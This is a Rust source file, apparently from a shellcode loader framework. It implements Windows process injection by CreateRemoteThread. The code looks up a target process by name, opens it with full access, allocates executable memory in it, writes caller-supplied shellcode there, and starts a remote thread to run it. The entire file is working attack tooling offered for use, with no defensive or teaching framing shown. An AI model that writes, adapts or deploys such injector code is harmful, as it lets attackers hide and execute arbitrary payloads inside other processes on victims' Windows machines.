use std::ffi::{c_void, OsString};
use std::mem::transmute;
use std::os::windows::ffi::OsStringExt;
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::{CloseHandle, FALSE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
};

use shared::{check, Executor};

pub struct CreateRemoteThreadInjectionExecutor {
    pub process_name: String,
}

impl Executor for CreateRemoteThreadInjectionExecutor {
    fn execute(&self, shellcode: Vec<u8>) -> anyhow::Result<()> {
        let shellcode_size = shellcode.len();
        unsafe {
            let process_id = find_process(&self.process_name).unwrap();

            let process_handler = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
            check!(process_handler != null_mut());

            let remote_addr = VirtualAllocEx(
                process_handler,
                null_mut(),
                shellcode_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            check!(!remote_addr.is_null());

            let res = WriteProcessMemory(
                process_handler,
                remote_addr,
                shellcode.as_ptr() as *const c_void,
                shellcode_size,
                null_mut(),
            );
            check!(res != FALSE);

            let remote_thread = CreateRemoteThread(
                process_handler,
                null_mut(),
                0,
                Some(transmute(remote_addr)),
                null_mut(),
                0,
                null_mut(),
            );
            check!(remote_thread != null_mut());
            WaitForSingleObject(remote_thread as *mut c_void, INFINITE);
            CloseHandle(remote_thread);
        }
        Ok(())
    }
}

unsafe fn find_process(process_name: &str) -> Option<u32> {
    let mut process_id = 0;
    // get snapshot of all processes
    let handle = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    check!(handle != null_mut());

    // iterate through processes and find target process
    let mut entry: PROCESSENTRY32 = std::mem::zeroed();
    entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
    let mut res = Process32First(handle, &mut entry);
    while res != FALSE {
        let p_name = OsString::from_wide(
            entry
                .szExeFile
                .iter()
                .map(|&x| x as u16)
                .collect::<Vec<u16>>()
                .as_slice(),
        );
        let p_name = p_name.to_string_lossy().to_lowercase();
        let pos = p_name.find("\0").unwrap();
        let p_name = &p_name[..pos];
        // println!("process_name find: {:?}", p_name);
        if p_name == process_name.to_lowercase() {
            process_id = entry.th32ProcessID;
            break;
        }
        res = unsafe { Process32Next(handle, &mut entry) };
    }
    unsafe { CloseHandle(handle) };

    // return process id
    if process_id == 0 {
        None
    } else {
        Some(process_id)
    }
}
